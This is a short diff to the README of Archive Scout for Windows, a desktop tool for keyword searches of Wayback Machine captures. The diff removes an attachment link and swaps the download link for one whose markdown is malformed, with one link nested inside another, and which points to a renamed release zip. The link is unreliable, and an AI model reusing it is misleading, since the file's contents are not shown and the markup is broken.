@@ -1,7 +1,6 @@
-[README.md](https://github.com/user-attachments/files/30527980/README.md)
 # Archive Scout for Windows
 
-[Download the latest release](https://github.com/DearStrike4940/archive-scout-windows/releases/latest/download/ArchiveScout-Windows-x64.zip)
+[Download the latest release]([https://github.com/DearStrike4940/archive-scout-windows/releases/latest/download/ArchiveScout-Windows-x64.zip](https://github.com/DearStrike4940/archive-scout-windows/releases/download/v1.2.0/ArchiveScout-Windows-x64.1.zip))
 
 
 Archive Scout is a desktop interface for researching public Wayback Machine captures. It can index multiple domains and paths, apply traditional CDX parameters, download archived text pages concurrently, scan them for custom keywords or regular expressions, resume interrupted work through SQLite, and produce plain UTF-8 text reports.
